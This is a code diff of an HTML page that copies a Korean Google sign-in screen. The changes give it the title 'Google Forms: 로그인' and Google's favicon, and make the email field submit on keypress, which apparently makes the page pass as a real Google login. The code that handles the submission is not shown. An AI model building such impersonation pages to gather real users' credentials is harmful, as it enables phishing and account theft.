@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=1920, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
     <script src="script.js"></script>
-    <title>안녕</title>
+    <title>Google Forms: 로그인</title>
+    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
 </head>
 <body>
     <div style="width:inherit; height:inherit;">
@@ -28,13 +29,13 @@
                         <div style="padding-top: 24px;">
                             <div style="margin-bottom: 32px;">
                                 <div style="padding-top: 8px; height:55px;">
-                                    <div class="inputBox">
-                                        <input type="text" id="labela" name="">
+                                    <form class="inputBox">
+                                        <input type="text" id="labela" name="" onkeypress="submit();">
                                         <label for="labela" id="labelin">이메일 또는 휴대전화</label>
-                                    </div>
+                                    </form>
                                 </div>
                                 <div style="padding-top: 9px; padding-bottom:3px;">
-                                    <button class="normal">이메일을 잊으셨나요?</button>
+                                    <button class="normal" id="forgotID">이메일을 잊으셨나요?</button>
                                 </div>
                             </div>
                             <div style="font-size:15px; padding-top: 9px; padding-bottom:3px; color:#5f6368; font-size: 15px;" class="center_h">
@@ -50,7 +51,7 @@
                                 </button>
                             </div>
                             <div class="nextbtn">
-                                <button>
+                                <button onclick="submit();">
                                     <div style="float: right;">
                                         <span class="Gsans" style="font-size: 14px;">다음</span>
                                     </div>
